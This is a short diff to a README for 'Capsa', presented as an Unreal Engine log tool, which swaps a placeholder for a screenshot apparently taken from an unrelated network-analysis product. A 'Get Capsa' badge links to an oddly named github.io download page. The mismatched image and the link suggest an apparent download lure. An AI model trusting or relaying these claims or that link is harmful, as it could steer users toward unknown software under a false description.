@@ -4,7 +4,7 @@
 
 [![Get Capsa](https://img.shields.io/badge/Get-Capsa-2c3e50?style=flat-square&logo=unrealengine&logoColor=white)](https://rydeenoctpeco.github.io/.github/Capsa-Unreal-Engine)
 
-![Capsa dashboard showing Unreal Engine project logs and searchable events](FOTO)
+![Capsa dashboard showing Unreal Engine project logs and searchable events](https://www.colasoft.com/images/capsahowtos/document-your-network-capsa-log-view-&-output-2.png)
 
 Capsa centralizes Unreal Engine logs so teams can search events, diagnose builds, and streamline game debugging from a focused workspace.
 
